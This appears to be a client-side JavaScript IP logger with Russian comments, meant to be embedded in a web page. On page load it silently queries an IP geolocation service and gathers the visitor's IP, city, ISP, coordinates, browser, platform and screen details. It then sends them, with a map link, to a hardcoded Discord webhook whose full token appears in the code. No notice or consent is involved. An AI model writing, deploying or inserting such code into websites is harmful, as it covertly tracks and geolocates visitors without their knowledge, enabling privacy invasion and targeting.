// Ваш Discord Webhook
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1542423199860527154/WbofVJ4OF_hZtXkshynf3pj__fbAed255JDxzO9dIccqRgZ18yl-YQ4oN_KDUWlwuhbm';

// Функция для отправки информации в Discord
async function sendVisitorInfo() {
    try {
        console.log('🔍 Начинаем сбор информации...');

        // Получаем информацию об IP
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        console.log('📍 IP данные получены:', ipData);

        // Получаем информацию о браузере
        const userAgent = navigator.userAgent;
        const language = navigator.language;
        const platform = navigator.platform;
        const screenResolution = `${window.screen.width}x${window.screen.height}`;

        // Ссылка на Google Maps
        const googleMapsLink = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;

        // Создаем сообщение для Discord
        const payload = {
            content: '🔴 **НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ!**',
            embeds: [{
                color: 16711680, // Красный цвет
                title: '📊 Информация о посетителе',
                fields: [
                    { 
                        name: '🌐 IP адрес', 
                        value: `\`${ipData.ip}\``, 
                        inline: false 
                    },
                    { 
                        name: '🌍 Страна', 
                        value: ipData.country_name || 'Неизвестно', 
                        inline: true 
                    },
                    { 
                        name: '🏙️ Город', 
                        value: ipData.city || 'Неизвестно', 
                        inline: true 
                    },
                    { 
                        name: '🗺️ Регион', 
                        value: ipData.region || 'Неизвестно', 
                        inline: true 
                    },
                    { 
                        name: '📡 Провайдер (ISP)', 
                        value: ipData.org || 'Неизвестно', 
                        inline: true 
                    },
                    { 
                        name: '⏰ Часовой пояс', 
                        value: ipData.timezone || 'Неизвестно', 
                        inline: true 
                    },
                    { 
                        name: '📍 Почтовый индекс', 
                        value: ipData.postal || 'Неизвестно', 
                        inline: true 
                    },
                    { 
                        name: '🎯 Координаты', 
                        value: `[${ipData.latitude}, ${ipData.longitude}](${googleMapsLink})`, 
                        inline: false 
                    },
                    { 
                        name: '🖥️ Браузер (User Agent)', 
                        value: `\`\`\`${userAgent}\`\`\``, 
                        inline: false 
                    },
                    { 
                        name: '💻 Платформа', 
                        value: platform, 
                        inline: true 
                    },
                    { 
                        name: '🌐 Язык', 
                        value: language, 
                        inline: true 
                    },
                    { 
                        name: '📺 Разрешение экрана', 
                        value: screenResolution, 
                        inline: true 
                    },
                    { 
                        name: '⌚ Время посещения', 
                        value: new Date().toLocaleString('ru-RU'), 
                        inline: false 
                    }
                ],
                thumbnail: {
                    url: 'https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1f30d.png'
                },
                footer: {
                    text: 'IP Logger | ' + new Date().toLocaleString('ru-RU'),
                    icon_url: 'https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1f4d1.png'
                }
            }]
        };

        console.log('📤 Отправляем на Discord...');
        console.log('Payload:', payload);

        // Используем fetch с обработкой ошибок
        const discordResponse = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        if (discordResponse.ok) {
            console.log('✅ Сообщение успешно отправлено в Discord!');
        } else {
            console.error('❌ Ошибка Discord:', discordResponse.status, discordResponse.statusText);
            const errorText = await discordResponse.text();
            console.error('Ответ Discord:', errorText);
        }

    } catch (error) {
        console.error('❌ Ошибка при отправке:', error);
    }
}

// Запускаем функцию при загрузке страницы
document.addEventListener('DOMContentLoaded', sendVisitorInfo);

// Если DOM уже загружен
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', sendVisitorInfo);
} else {
    sendVisitorInfo();
}

